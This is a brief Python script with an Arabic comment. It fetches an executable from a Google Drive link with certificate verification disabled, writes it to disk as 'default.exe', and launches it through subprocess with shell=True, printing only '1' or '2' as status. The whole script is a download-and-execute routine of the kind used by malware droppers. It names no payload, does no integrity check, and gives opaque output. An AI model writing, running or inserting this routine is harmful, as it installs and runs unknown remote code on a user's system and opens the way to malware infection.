import requests
import subprocess

url = 'https://drive.google.com/u/0/uc?id=1CFBZcZLkVIhCN3mGxNx-xZm5u5b13Wkq&export=download&confirm=t&uuid=ac5eab06-5c03-4d8e-86ca-b4189d630e1e&at=ALt4Tm2Nh5k6K6hSuzS3zATBYyuu:1689838188553'
myfile = requests.get(url, allow_redirects=True, verify=False)

if myfile.status_code == 200:
    with open("default.exe", "wb") as f:
        f.write(myfile.content)
    print("1")

    # تشغيل الملف .exe باستخدام وحدة subprocess
    try:
        subprocess.run("default.exe", shell=True)
    except Exception as e:
        print("2", e)
else:
    print("2")
